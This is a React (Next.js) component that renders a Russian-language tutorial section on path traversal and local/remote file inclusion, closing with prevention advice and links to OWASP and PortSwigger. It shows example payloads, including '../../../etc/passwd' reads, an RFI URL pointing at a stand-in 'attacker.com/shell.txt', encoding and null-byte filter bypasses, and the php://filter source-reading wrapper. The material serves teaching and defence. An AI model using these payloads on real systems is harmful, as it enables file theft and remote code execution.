
import Link from 'next/link';
import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card';
import { Accordion, AccordionContent, AccordionItem, AccordionTrigger } from "@/components/ui/accordion";

const LinkStyle = "text-primary hover:text-primary/80 hover:underline";

const pathTraversalAccordionItems = [
  {
    id: "path-traversal-info",
    title: "Обход Пути (Path Traversal)",
    content: <p className="text-muted-foreground">Манипуляция параметрами (<code>?file=../../../etc/passwd</code>) для доступа к системным файлам. <Link href="https://portswigger.net/web-security/file-path-traversal" target="_blank" rel="noopener noreferrer" className={LinkStyle}>Лаборатории PortSwigger (Path Traversal)</Link>.</p>
  },
  {
    id: "file-inclusion-info",
    title: "Включение Файлов (LFI/RFI)",
    content: (
      <>
        <p className="text-muted-foreground mb-2"><strong>LFI (Local File Inclusion):</strong> Приложение включает содержимое локального файла (<code>?page=../../../../etc/passwd</code>). Чтение исходного кода, логов. <Link href="https://owasp.org/www-community/attacks/Path_Traversal#Local_File_Inclusion" target="_blank" rel="noopener noreferrer" className={LinkStyle}>OWASP LFI</Link>.</p>
        <p className="text-muted-foreground"><strong>RFI (Remote File Inclusion):</strong> Приложение включает файл с удаленного URL (<code>?page=http://attacker.com/shell.txt</code>). Часто приводит к RCE. Реже, т.к. <code>allow_url_include</code> обычно off. <Link href="https://owasp.org/www-community/attacks/Remote_File_Inclusion" target="_blank" rel="noopener noreferrer" className={LinkStyle}>OWASP RFI</Link>.</p>
      </>
    )
  },
  {
    id: "bypass-techniques-info",
    title: "Техники Обхода Фильтров и Эксплуатации",
    content: (
      <>
        <p className="text-muted-foreground mb-2"><strong>Обход:</strong> URL-кодирование (<code>%2e%2e%2f</code>), двойное кодирование, <code>..\\/</code>, Null Byte (<code>%00</code>) в старых PHP.</p>
        <p className="text-muted-foreground"><strong>PHP Wrappers:</strong> <code>php://filter/convert.base64-encode/resource=</code> для чтения исходного кода PHP. <Link href="https://www.php.net/manual/en/wrappers.php.php" target="_blank" rel="noopener noreferrer" className={LinkStyle}>PHP Wrappers</Link>.</p>
      </>
    )
  }
];

export function PathTraversalSection() {
  return (
    <section id="path-traversal" className="py-16 md:py-24 bg-card">
      <div className="container mx-auto px-4 sm:px-6 lg:px-8">
        <div className="text-center mb-12">
          <h2 className="text-3xl font-bold tracking-tight text-foreground">C. Обход Пути и Включение Файлов (Path Traversal & LFI/RFI)</h2>
          <p className="mt-2 max-w-3xl mx-auto text-lg text-muted-foreground">Эти уязвимости позволяют читать произвольные файлы или включать локальное/удаленное содержимое.</p>
        </div>
        <div className="max-w-3xl mx-auto space-y-3">
          <Accordion type="single" collapsible className="w-full space-y-3">
            {pathTraversalAccordionItems.map((item) => (
              <AccordionItem value={item.id} key={item.id} className="border-b-0">
                 <AccordionTrigger className="bg-primary hover:bg-primary/90 text-primary-foreground p-4 rounded-lg font-semibold flex justify-between items-center hover:no-underline">
                  {item.title}
                </AccordionTrigger>
                <AccordionContent className="bg-card p-4 rounded-b-lg border border-t-0 border-border mt-[-0.5rem] pt-6">
                  {item.content}
                </AccordionContent>
              </AccordionItem>
            ))}
          </Accordion>
          <Card className="shadow-lg mt-3">
             <CardHeader>
                <CardTitle className="font-semibold text-primary text-xl">Предотвращение LFI/RFI</CardTitle>
            </CardHeader>
            <CardContent>
                <p className="text-sm text-muted-foreground">Строгая валидация, "белый список" файлов/путей, хранение идентификаторов в БД, отключение <code>allow_url_include</code>/<code>allow_url_fopen</code> в PHP. <Link href="https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html#LFI-RFI" target="_blank" rel="noopener noreferrer" className={LinkStyle}>OWASP LFI/RFI Prevention</Link>.</p>
            </CardContent>
          </Card>
        </div>
      </div>
    </section>
  );
}
